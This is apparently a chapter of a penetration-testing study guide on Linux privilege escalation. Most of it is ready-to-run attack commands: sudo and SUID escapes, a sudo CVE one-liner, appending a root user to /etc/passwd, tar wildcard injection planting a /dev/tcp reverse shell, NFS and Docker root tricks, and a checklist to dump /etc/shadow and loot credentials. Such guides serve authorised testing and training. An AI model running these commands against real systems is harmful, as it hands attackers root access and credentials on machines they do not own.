# 05 · Linux privilege escalation

You have a shell as a low-priv user. Enumerate the local vantage point exhaustively, then match a
finding to a vector. Re-run this after landing every new user.

---

## 5.1 Enumerate

```bash
id; sudo -l; hostname; uname -a; cat /etc/issue           # who am I, kernel, sudo rights
cat /etc/passwd; ls -la /home/*                           # users, home dirs
ps aux --forest; netstat -tulpn || ss -tulpn              # processes, internal-only listeners
find / -perm -4000 -type f 2>/dev/null                    # SUID
getcap -r / 2>/dev/null                                   # capabilities
crontab -l; cat /etc/crontab; ls -la /etc/cron*           # scheduled jobs
find / -writable -type d 2>/dev/null | grep -v proc       # writable dirs
```

Then automate — but read the manual results first, don't outsource your thinking:
```bash
./linpeas.sh          # broad; highlights vectors by likelihood
./pspy64              # watch cron/root processes fire in real time (no root needed)
linux-exploit-suggester.sh    # kernel CVE candidates from uname
```

> 💡 An internal-only listener (`127.0.0.1:<port>` in `ss` but absent from your Nmap) is a privesc or
> pivot lead — tunnel to it (see [§07](07-pivoting-and-tunneling.md)).

## 5.2 sudo -l

Anything you can run as another user is a candidate — check every entry against **GTFOBins**.
```bash
sudo -l
sudo <binary>          # then the GTFOBins escape (e.g. sudo vim → :!sh)
```
- **LD_PRELOAD** (if `env_keep+=LD_PRELOAD`): compile a `.so` with an `_init()` that spawns a root shell,
  then `sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>`.
- **CVE-2019-14287** (sudo < 1.8.28): `sudo -u#-1 /bin/bash` → root.
- **systemctl/timer** entries: if you can `systemctl` a unit whose file (or the binary it calls) you control.

## 5.3 SUID / SGID

```bash
find / -perm -u=s -type f 2>/dev/null
```
- Check each against **GTFOBins** for a `-p` (preserve-priv) escape.
- **Writable `/etc/passwd`** → add a root-equivalent user:
  ```bash
  openssl passwd -1 -salt s pass                     # → $1$s$...
  echo 'me:$1$s$...:0:0:root:/root:/bin/bash' >> /etc/passwd; su me
  ```
- SUID binary that calls another program **by name** (not absolute path) → PATH hijack (§5.5).

## 5.4 Capabilities

```bash
getcap -r / 2>/dev/null
# e.g. cap_setuid on python/perl/vim:
./python -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## 5.5 Cron, PATH & wildcard abuse

- **Writable cron script** run by root → drop a reverse shell / `chmod +s /bin/bash` in it.
- **PATH hijack:** root cron/SUID calls `tar` (no path) and you can write to an earlier PATH dir →
  plant a fake `tar`. Find writable dirs: `find / -writable 2>/dev/null | grep -vE 'proc|/tmp'`.
- **tar wildcard injection** (root runs `tar cf ... *` in a dir you control):
  ```bash
  echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' > shell.sh
  touch './--checkpoint=1'; touch './--checkpoint-action=exec=sh shell.sh'
  # GNU tar; if that's stripped, try:  touch './--use-compress-program=/tmp/pwn.sh'
  ```

> 💡 Don't know *what* fires a script? `grep -R scriptname /etc /var 2>/dev/null` and confirm timing with
> `pspy64`. When `ls -lt` doesn't reveal the prize, hunt root-owned-writable units:
> `find / -type f -writable -user root \( -name '*.sh' -o -name '*.service' -o -name '*.timer' \) 2>/dev/null`.

## 5.6 NFS no_root_squash

```bash
cat /etc/exports                 # look for no_root_squash
showmount -e <ip>                # from attacker
# mount as root on attacker, drop a SUID root shell, run it back on the target:
mkdir /tmp/nfs; sudo mount -o rw <ip>:/export /tmp/nfs
# compile setuid(0) C binary into /tmp/nfs, chmod +s → execute on the target as low-priv
```
The server keeps root ownership + SUID bit, so the binary runs as root when executed locally.

## 5.7 Other high-value checks

- **Writable `.ssh/authorized_keys`** (yours or root's) → add your key, `ssh` straight in.
- **Docker group / `.dockerenv`**: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` = host root.
- **Readable config/backups**: DB configs, `.bash_history`, `.git`, world-readable `/opt` apps → creds.
- **Kernel exploit** as a last resort (DirtyPipe/DirtyCow/PwnKit) — match `uname -a` carefully, they can crash the box.

## 5.8 Before you move on

- [ ] `sudo -l`, SUID, SGID, capabilities, cron, and writable root-owned files all enumerated.
- [ ] linpeas + pspy run; every "highlighted" finding chased.
- [ ] Internal-only ports noted for pivoting.
- [ ] Root obtained → grab `proof.txt`, dump `/etc/shadow`, and loot creds for the next host.
